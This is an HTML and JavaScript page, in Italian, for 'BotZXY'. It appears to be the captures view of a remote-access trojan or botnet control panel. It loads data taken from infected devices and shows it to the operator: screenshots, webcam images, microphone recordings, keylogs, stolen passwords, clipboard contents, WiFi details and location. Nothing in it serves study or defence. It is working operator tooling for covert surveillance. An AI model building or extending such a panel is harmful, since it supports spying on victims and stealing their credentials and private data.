<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>BotZXY · Captures</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Inter',sans-serif; background:var(--bg-primary,#0b0b1a); color:var(--text-primary,#e2e8f0); min-height:100vh; display:flex; }
        .sidebar, .card, .capture-item { background:var(--bg-card,rgba(18,18,40,0.45)); border-color:var(--border-color,rgba(255,255,255,0.04)); }
        .sidebar { width:220px; background:rgba(12,12,35,0.92); backdrop-filter:blur(24px); border-right:1px solid rgba(255,255,255,0.04); padding:1.8rem 1.2rem; display:flex; flex-direction:column; min-height:100vh; position:fixed; top:0; left:0; height:100vh; z-index:100; }
        .sidebar .logo { font-size:1.6rem; font-weight:800; background:linear-gradient(135deg,#8b5cf6,#22d3ee); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; padding-bottom:1.5rem; border-bottom:1px solid rgba(255,255,255,0.04); }
        .sidebar .logo i { -webkit-text-fill-color:initial; color:#8b5cf6; }
        .sidebar .logo span { -webkit-text-fill-color:rgba(255,255,255,0.1); }
        .sidebar .nav { display:flex; flex-direction:column; gap:0.2rem; flex:1; padding-top:1.2rem; }
        .sidebar .nav a { display:flex; align-items:center; gap:0.8rem; padding:0.7rem 1rem; border-radius:12px; color:rgba(255,255,255,0.3); text-decoration:none; font-size:0.85rem; font-weight:500; transition:all 0.3s; }
        .sidebar .nav a i { font-size:1.1rem; min-width:24px; }
        .sidebar .nav a:hover { color:#fff; background:rgba(139,92,246,0.08); }
        .sidebar .nav a.active { color:#8b5cf6; background:rgba(139,92,246,0.1); }
        .sidebar .nav a .badge-nav { margin-left:auto; background:rgba(139,92,246,0.15); color:#8b5cf6; font-size:0.6rem; padding:0.1rem 0.6rem; border-radius:40px; }
        .sidebar .footer-sidebar { font-size:0.6rem; color:rgba(255,255,255,0.06); text-align:center; padding-top:1rem; border-top:1px solid rgba(255,255,255,0.04); letter-spacing:0.05em; }
        .sidebar .footer-sidebar .status-dot { display:inline-block; width:6px; height:6px; border-radius:50%; background:#34d399; box-shadow:0 0 12px rgba(52,211,153,0.4); animation:pulse 2s ease-in-out infinite; margin-right:6px; }
        @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.3; } }
        .main { margin-left:220px; padding:1.8rem 2.2rem; width:100%; }
        .topbar { display:flex; justify-content:space-between; align-items:center; margin-bottom:2rem; flex-wrap:wrap; gap:0.8rem; }
        .topbar h1 { font-size:1.4rem; font-weight:600; }
        .topbar h1 span { color:rgba(255,255,255,0.2); font-weight:400; }
        .topbar .actions { display:flex; gap:0.6rem; flex-wrap:wrap; }
        .btn-ghost { background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.06); color:rgba(255,255,255,0.4); padding:0.4rem 1rem; border-radius:40px; cursor:pointer; font-size:0.75rem; transition:all 0.3s; display:flex; align-items:center; gap:0.4rem; }
        .btn-ghost:hover { background:rgba(139,92,246,0.08); color:#fff; border-color:rgba(139,92,246,0.2); }
        .card { background:var(--bg-card,rgba(18,18,40,0.45)); backdrop-filter:blur(12px); border:1px solid var(--border-color,rgba(255,255,255,0.04)); border-radius:24px; padding:1.5rem; margin-bottom:1.5rem; }
        .card .header { display:flex; justify-content:space-between; align-items:center; margin-bottom:1rem; flex-wrap:wrap; gap:0.5rem; }
        .card .header h2 { font-size:1rem; font-weight:600; display:flex; align-items:center; gap:0.6rem; }
        .card .header h2 i { color:#8b5cf6; }
        .card .header .filter-group { display:flex; gap:0.5rem; align-items:center; flex-wrap:wrap; }
        .card .header .filter-group select { background:rgba(255,255,255,0.04); border:1px solid rgba(255,255,255,0.06); color:#fff; padding:0.3rem 0.8rem; border-radius:8px; font-size:0.75rem; font-family:'Inter',sans-serif; }
        .card .header .filter-group select:focus { outline:none; border-color:#8b5cf6; }
        .capture-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(280px,1fr)); gap:1.2rem; }
        .capture-item { background:var(--bg-card,rgba(18,18,40,0.3)); border:1px solid var(--border-color,rgba(255,255,255,0.04)); border-radius:16px; overflow:hidden; transition:all 0.3s; }
        .capture-item:hover { border-color:rgba(139,92,246,0.2); transform:translateY(-2px); }
        .capture-item .preview { width:100%; height:180px; background:#0a0a1a; display:flex; align-items:center; justify-content:center; overflow:hidden; }
        .capture-item .preview img { width:100%; height:100%; object-fit:cover; }
        .capture-item .preview .placeholder { font-size:2.5rem; opacity:0.2; }
        .capture-item .info { padding:0.8rem 1rem; }
        .capture-item .info .type { font-weight:600; font-size:0.8rem; }
        .capture-item .info .meta { font-size:0.65rem; color:rgba(255,255,255,0.2); margin-top:0.2rem; }
        .capture-item .info .actions { margin-top:0.5rem; display:flex; gap:0.3rem; }
        .empty-state { text-align:center; padding:2.5rem; color:rgba(255,255,255,0.1); }
        .empty-state i { font-size:2rem; display:block; margin-bottom:0.5rem; }
        ::-webkit-scrollbar { width:4px; height:4px; }
        ::-webkit-scrollbar-track { background:transparent; }
        ::-webkit-scrollbar-thumb { background:rgba(139,92,246,0.3); border-radius:10px; }
        .sidebar-overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.5); z-index:90; }
        .sidebar-overlay.active { display:block; }
        .hamburger { display:none; background:rgba(255,255,255,0.04); border:1px solid rgba(255,255,255,0.06); color:#fff; padding:0.4rem 0.8rem; border-radius:10px; cursor:pointer; }
        @media (max-width:768px) { .sidebar { transform:translateX(-100%); width:240px; } .sidebar.open { transform:translateX(0); } .main { margin-left:0; padding:1rem; } .topbar { flex-direction:column; align-items:stretch; } .hamburger { display:block; } .capture-grid { grid-template-columns:1fr 1fr; } }
        @media (max-width:480px) { .capture-grid { grid-template-columns:1fr; } }
        .modal-overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.8); z-index:200; align-items:center; justify-content:center; padding:2rem; }
        .modal-overlay.active { display:flex; }
        .modal-content { background:#1a1a3a; border-radius:24px; max-width:90vw; max-height:90vh; padding:1.5rem; position:relative; }
        .modal-content img { max-width:100%; max-height:80vh; border-radius:12px; }
        .modal-content .close { position:absolute; top:-10px; right:-10px; background:#ff4444; border:none; color:#fff; width:36px; height:36px; border-radius:50%; font-size:1.2rem; cursor:pointer; }
    </style>
    <script>
        (function() {
            const savedTheme = localStorage.getItem('botzxy_theme') || 'dark';
            const themes = {
                'dark': { bg: '#0b0b1a', text: '#e2e8f0', card: 'rgba(18,18,40,0.45)', border: 'rgba(255,255,255,0.04)' },
                'light': { bg: '#f1f5f9', text: '#0a0a1a', card: 'rgba(255,255,255,0.85)', border: 'rgba(0,0,0,0.08)' },
                'blue': { bg: '#0a1a3a', text: '#e2e8f0', card: 'rgba(10,26,58,0.7)', border: 'rgba(59,130,246,0.15)' },
                'green': { bg: '#0a1a0a', text: '#e2e8f0', card: 'rgba(10,26,10,0.7)', border: 'rgba(52,211,153,0.15)' },
                'purple': { bg: '#1a0a2a', text: '#e2e8f0', card: 'rgba(26,10,42,0.7)', border: 'rgba(139,92,246,0.15)' },
                'orange': { bg: '#2a1a0a', text: '#e2e8f0', card: 'rgba(42,26,10,0.7)', border: 'rgba(245,158,11,0.15)' },
                'cyber': { bg: '#0a0a0a', text: '#00ff88', card: 'rgba(0,0,0,0.7)', border: 'rgba(0,255,136,0.15)' },
                'matrix': { bg: '#0a0a0a', text: '#00ff00', card: 'rgba(0,0,0,0.7)', border: 'rgba(0,255,0,0.15)' }
            };
            const t = themes[savedTheme] || themes['dark'];
            
            document.documentElement.style.setProperty('--bg-primary', t.bg);
            document.documentElement.style.setProperty('--text-primary', t.text);
            document.documentElement.style.setProperty('--bg-card', t.card);
            document.documentElement.style.setProperty('--border-color', t.border);
            
            if (document.body) {
                document.body.style.background = t.bg;
                document.body.style.color = t.text;
                document.body.className = 'theme-' + savedTheme;
            }
            
            var selectors = ['.card', '.settings-card', '.stat-card', '.device-card', '.capture-item', '.stat-box', '.chart-card', '.table-card', '.sidebar'];
            for (var i = 0; i < selectors.length; i++) {
                var elements = document.querySelectorAll(selectors[i]);
                for (var j = 0; j < elements.length; j++) {
                    if (elements[j]) {
                        elements[j].style.background = t.card;
                        elements[j].style.borderColor = t.border;
                    }
                }
            }
            
            var savedLang = localStorage.getItem('botzxy_language') || 'it';
            document.documentElement.lang = savedLang;
        })();
    </script>
</head>
<body>
    <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>
    <aside class="sidebar" id="sidebar">
        <div class="logo"><i class="fas fa-robot"></i> Bot<span>ZXY</span></div>
        <nav class="nav">
            <a href="/dashboard" data-i18n="dashboard"><i class="fas fa-tachometer-alt"></i> Dashboard</a>
            <a href="/devices" data-i18n="devices"><i class="fas fa-mobile-alt"></i> Devices <span class="badge-nav" id="deviceBadge">0</span></a>
            <a href="#" class="active" data-i18n="captures"><i class="fas fa-camera"></i> Captures <span class="badge-nav" id="captureBadge">0</span></a>
            <a href="/analytics" data-i18n="analytics"><i class="fas fa-chart-pie"></i> Analytics</a>
            <a href="/logs" data-i18n="logs"><i class="fas fa-history"></i> Logs</a>
            <a href="/remote" data-i18n="remote"><i class="fas fa-desktop"></i> Remote</a>
            <a href="/settings" data-i18n="settings"><i class="fas fa-cog"></i> Settings</a>
            <a href="/logout" data-i18n="logout"><i class="fas fa-sign-out-alt"></i> Logout</a>
        </nav>
        <div class="footer-sidebar"><span class="status-dot"></span> <span data-i18n="system_active">Sistema attivo</span> · <span id="footerTime"></span></div>
    </aside>
    <main class="main">
        <div class="topbar">
            <div style="display:flex;align-items:center;gap:0.8rem;"><button class="hamburger" onclick="toggleSidebar()"><i class="fas fa-bars"></i></button><h1><span data-i18n="captures">Captures</span> <span>| <span data-i18n="screenshots_webcam">Screenshot, Webcam, Keylog, Password</span></span></h1></div>
            <div class="actions"><button class="btn-ghost" onclick="refreshCaptures()"><i class="fas fa-sync"></i> <span data-i18n="refresh">Aggiorna</span></button></div>
        </div>
        <div class="card">
            <div class="header">
                <h2><i class="fas fa-images"></i> <span data-i18n="captures">Catture</span></h2>
                <div class="filter-group">
                    <select id="filterType" onchange="applyFilters()">
                        <option value="all" data-i18n="all_types">Tutti i tipi</option>
                        <option value="screenshot">📸 <span data-i18n="screenshot">Screenshot</span></option>
                        <option value="webcam">📷 <span data-i18n="webcam">Webcam</span></option>
                        <option value="mic">🎤 <span data-i18n="mic">Microfono</span></option>
                        <option value="keylog">⌨️ <span data-i18n="keylog">Keylog</span></option>
                        <option value="passwords">🔑 <span data-i18n="passwords">Password</span></option>
                        <option value="clipboard">📋 <span data-i18n="clipboard">Clipboard</span></option>
                        <option value="wifi">📶 <span data-i18n="wifi">WiFi</span></option>
                        <option value="location">📍 <span data-i18n="location">Location</span></option>
                    </select>
                </div>
            </div>
            <div class="capture-grid" id="captureGrid"></div>
        </div>
    </main>
    <div class="modal-overlay" id="previewModal" onclick="if(event.target===this)closePreview()">
        <div class="modal-content"><button class="close" onclick="closePreview()">✕</button><img id="previewImage" src="" alt="Preview" /></div>
    </div>
    <script src="/static/js/config.js"></script>
    <script>
        let capturesData = [];
        function toggleSidebar() { document.getElementById('sidebar').classList.toggle('open'); document.getElementById('sidebarOverlay').classList.toggle('active'); }
        function refreshCaptures() {
            const grid = document.getElementById('captureGrid');
            grid.innerHTML = `<div style="grid-column:1/-1;text-align:center;padding:2rem;color:rgba(255,255,255,0.1);"><i class="fas fa-spinner fa-spin"></i> <span data-i18n="loading">Caricamento...</span></div>`;
            fetch('/api/captures?limit=50').then(r=>r.json()).then(data=>{ capturesData=data; renderCaptures(data); document.getElementById('captureBadge').textContent=data.length; }).catch(()=>{
                grid.innerHTML = `<div style="grid-column:1/-1;text-align:center;padding:2rem;color:rgba(255,255,255,0.1);"><i class="fas fa-exclamation-triangle"></i> <span data-i18n="no_captures">Nessuna cattura disponibile</span></div>`;
            });
        }
        function renderCaptures(captures) {
            const grid = document.getElementById('captureGrid');
            const filtered = applyFilters(captures);
            if (!filtered || filtered.length===0) { grid.innerHTML = `<div style="grid-column:1/-1;text-align:center;padding:2rem;color:rgba(255,255,255,0.1);"><i class="fas fa-inbox"></i> <span data-i18n="no_captures">Nessuna cattura trovata</span></div>`; return; }
            const typeIcons = {'screenshot':'fa-desktop','webcam':'fa-camera','mic':'fa-microphone','keylog':'fa-keyboard','passwords':'fa-key','clipboard':'fa-clipboard','wifi':'fa-wifi','location':'fa-map-pin','mouse':'fa-mouse','files':'fa-folder'};
            const typeLabels = {'screenshot':'Screenshot','webcam':'Webcam','mic':'Microfono','keylog':'Keylog','passwords':'Password','clipboard':'Clipboard','wifi':'WiFi','location':'Location','mouse':'Mouse','files':'Files'};
            const typeColors = {'screenshot':'#8b5cf6','webcam':'#22d3ee','mic':'#f472b6','keylog':'#f59e0b','passwords':'#ef4444','clipboard':'#34d399','wifi':'#60a5fa','location':'#f97316','mouse':'#a855f7','files':'#14b8a6'};
            let html = '';
            filtered.forEach(c=>{
                const icon = typeIcons[c.type] || 'fa-file';
                const label = typeLabels[c.type] || c.type;
                const color = typeColors[c.type] || '#666';
                const time = new Date(c.created_at).toLocaleString();
                const device = c.device_id ? c.device_id.substring(0,12) + '...' : 'Unknown';
                let previewContent = '';
                if ((c.type === 'screenshot' || c.type === 'webcam') && c.data) { previewContent = `<img src="data:image/png;base64,${c.data}" alt="${label}" onclick="openPreview('data:image/png;base64,${c.data}')" />`; }
                else if (c.type === 'mic' && c.data) { previewContent = `<audio controls style="width:100%;max-height:150px;"><source src="data:audio/wav;base64,${c.data}" type="audio/wav"></audio>`; }
                else if (c.data) { let text = typeof c.data === 'string' ? c.data : JSON.stringify(c.data, null, 2); previewContent = `<div style="padding:0.5rem;font-size:0.7rem;color:rgba(255,255,255,0.3);word-break:break-all;max-height:150px;overflow-y:auto;">${text.substring(0,200)}${text.length>200?'...':''}</div>`; }
                else { previewContent = `<span class="placeholder"><i class="fas ${icon}" style="font-size:2rem;opacity:0.3;"></i></span>`; }
                html += `<div class="capture-item"><div class="preview">${previewContent}</div><div class="info"><div class="type" style="color:${color};"><i class="fas ${icon}"></i> ${label}</div><div class="meta"><span data-i18n="device">Device</span>: ${device} · ${time}</div><div class="actions"><button class="btn-ghost" style="padding:0.2rem 0.5rem;font-size:0.6rem;" onclick="alert('<span data-i18n="details">Dettagli cattura</span>: ${c.id}')"><i class="fas fa-info-circle"></i></button><button class="btn-ghost" style="padding:0.2rem 0.5rem;font-size:0.6rem;color:#ef4444;" onclick="if(confirm('<span data-i18n="delete_confirm">Eliminare?</span>'))alert('<span data-i18n="deleted">Eliminato</span>')"><i class="fas fa-trash"></i></button></div></div></div>`;
            });
            grid.innerHTML = html;
        }
        function applyFilters(captures) {
            const data = captures || capturesData;
            const type = document.getElementById('filterType').value;
            if (type === 'all') return data;
            return data.filter(c => c.type === type);
        }
        function openPreview(src) { document.getElementById('previewImage').src = src; document.getElementById('previewModal').classList.add('active'); }
        function closePreview() { document.getElementById('previewModal').classList.remove('active'); }
        function updateTime() { document.getElementById('footerTime').textContent = new Date().toLocaleTimeString('it-IT'); }
        fetch('/api/stats').then(r=>r.json()).then(data=>{ document.getElementById('deviceBadge').textContent=data.total_devices||0; document.getElementById('captureBadge').textContent=data.total_captures||0; });
        refreshCaptures(); setInterval(refreshCaptures,30000); setInterval(updateTime,1000); updateTime();
    </script>
</body>
</html>
